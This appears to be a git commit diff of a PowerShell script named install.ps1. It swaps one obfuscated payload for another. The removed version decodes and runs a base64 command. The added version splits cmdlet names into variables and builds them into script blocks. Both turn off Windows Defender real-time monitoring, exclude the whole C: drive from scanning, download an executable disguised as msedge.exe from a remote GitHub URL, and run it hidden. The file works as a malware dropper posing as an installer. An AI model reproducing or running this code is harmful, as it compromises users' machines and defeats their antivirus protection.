a9da794ee5e8a67f7fbe6b8494d2245dfb296953
Nxtccijo <ietsbdbd@gmail.com>
2025-03-20 11:19:43 +0100

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,3 +1,16 @@
-$encodedCommand = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQpBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICdDOlwnCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9OeHRjY2lvby9vb293L3JlZnMvaGVhZHMvbWFpbi9tc2VkZ2UuZXhlJyAtT3V0RmlsZSAnJGVudjpURU1QXG1zZWRnZS5leGUnClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICckZW52OlRFTVBcbXNlZGdlLmV4ZScgLVdpbmRvd1N0eWxlIEhpZGRlbiAtV2FpdA=="
-$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
-Invoke-Expression $decodedCommand
+$v1 = "Set-MpPreference"
+$v2 = "DisableRealtimeMonitoring"
+$v3 = "Add-MpPreference"
+$v4 = "ExclusionPath"
+$v5 = "Invoke-WebRequest"
+$v6 = "OutFile"
+$v7 = "Start-Process"
+$v8 = "FilePath"
+$v9 = "WindowStyle"
+$v10 = "Hidden"
+$v11 = "Wait"
+
+& ([ScriptBlock]::Create("$v1 -$v2 `$true"))
+& ([ScriptBlock]::Create("$v3 -$v4 'C:\'"))
+& ([ScriptBlock]::Create("$v5 -Uri 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe' -$v6 '$env:TEMP\msedge.exe'"))
+& ([ScriptBlock]::Create("$v7 -$v8 '$env:TEMP\msedge.exe' -$v9 $v10 -$v11"))
